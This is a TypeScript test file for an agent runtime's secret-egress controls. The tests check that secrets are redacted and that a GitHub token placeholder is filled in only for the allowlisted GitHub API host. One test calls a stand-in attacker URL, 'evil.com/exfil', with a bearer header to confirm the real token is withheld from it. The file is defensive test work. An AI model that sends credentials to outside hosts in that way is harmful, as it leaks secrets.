import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  buildEgressSecrets,
  patchFetchWithEgressSubstitution,
} from "../scripts-runtime/egress-secrets";
import { runScript } from "../scripts-runtime/loader";
import { refreshSecretScrubberCache } from "../utils/secret-scrubber";

const savedEnv = { ...process.env };

beforeEach(() => {
  process.env.AGENT_SWARM_API_KEY = "runtime-egress-secret-1234567890";
  refreshSecretScrubberCache();
});

afterEach(() => {
  for (const key of Object.keys(process.env)) {
    if (!(key in savedEnv)) delete process.env[key];
  }
  for (const [key, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  refreshSecretScrubberCache();
});

describe("runtime secret egress", () => {
  test("scrubObject catches unwrapped returned config secrets", async () => {
    const output = await runScript({
      agentId: "agent-1",
      resources: { memoryMb: 2048 },
      source:
        "export default async (_args, ctx) => ({ leaked: ctx.stdlib.Redacted.value(ctx.swarm.config.apiKey) });",
    });

    expect(output.result).toEqual({ leaked: "[REDACTED:AGENT_SWARM_API_KEY]" });
  });

  test("wrapped config values stringify to redacted in the result file", async () => {
    const output = await runScript({
      agentId: "agent-1",
      resources: { memoryMb: 2048 },
      source: "export default async (_args, ctx) => ({ wrapped: ctx.swarm.config.apiKey });",
    });

    expect(output.result).toEqual({ wrapped: "<redacted>" });
  });
});

describe("egress-substitution", () => {
  describe("buildEgressSecrets", () => {
    test("includes GITHUB_TOKEN when set in env", async () => {
      process.env.GITHUB_TOKEN = "ghp_test1234567890abcdef";
      const secrets = await buildEgressSecrets();
      expect(secrets).toEqual([
        {
          configKey: "GITHUB_TOKEN",
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          authKind: "config",
          value: "ghp_test1234567890abcdef",
        },
      ]);
    });

    test("returns empty array when GITHUB_TOKEN not set", async () => {
      delete process.env.GITHUB_TOKEN;
      const secrets = await buildEgressSecrets();
      expect(secrets).toEqual([]);
    });
  });

  describe("patchFetchWithEgressSubstitution", () => {
    let originalFetch: typeof globalThis.fetch;

    beforeEach(() => {
      originalFetch = globalThis.fetch;
    });

    afterEach(() => {
      globalThis.fetch = originalFetch;
    });

    test("substitutes placeholder in Authorization header for allowlisted host", async () => {
      let capturedHeaders: Headers | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedHeaders = new Headers(init?.headers);
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/repos/test/test", {
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
      });

      expect(capturedHeaders?.get("authorization")).toBe("Bearer ghp_real_secret_value_123");
    });

    test("does NOT substitute for non-allowlisted host", async () => {
      let capturedHeaders: Headers | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedHeaders = new Headers(init?.headers);
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://evil.com/exfil", {
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
      });

      expect(capturedHeaders?.get("authorization")).toBe("Bearer [REDACTED:GITHUB_TOKEN]");
    });

    test("passes through requests with no redacted placeholders", async () => {
      let callCount = 0;
      globalThis.fetch = async (_input: any, _init?: any) => {
        callCount++;
        return new Response("ok", { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/repos/test/test", {
        headers: { Accept: "application/json" },
      });

      expect(callCount).toBe(1);
    });

    test("does not substitute in request body", async () => {
      let capturedBody: string | undefined;
      globalThis.fetch = async (_input: any, init?: any) => {
        capturedBody = init?.body;
        return new Response("ok", { status: 200 });
      };

      patchFetchWithEgressSubstitution([
        {
          placeholder: "[REDACTED:GITHUB_TOKEN]",
          allowedHosts: ["api.github.com"],
          headerTemplate: "Authorization: Bearer [REDACTED:GITHUB_TOKEN]",
          scope: "global",
          scopeId: null,
          active: true,
          value: "ghp_real_secret_value_123",
        },
      ]);

      await globalThis.fetch("https://api.github.com/gists", {
        method: "POST",
        headers: { Authorization: "Bearer [REDACTED:GITHUB_TOKEN]" },
        body: JSON.stringify({ content: "[REDACTED:GITHUB_TOKEN]" }),
      });

      expect(capturedBody).toContain("[REDACTED:GITHUB_TOKEN]");
      expect(capturedBody).not.toContain("ghp_real_secret_value_123");
    });
  });
});
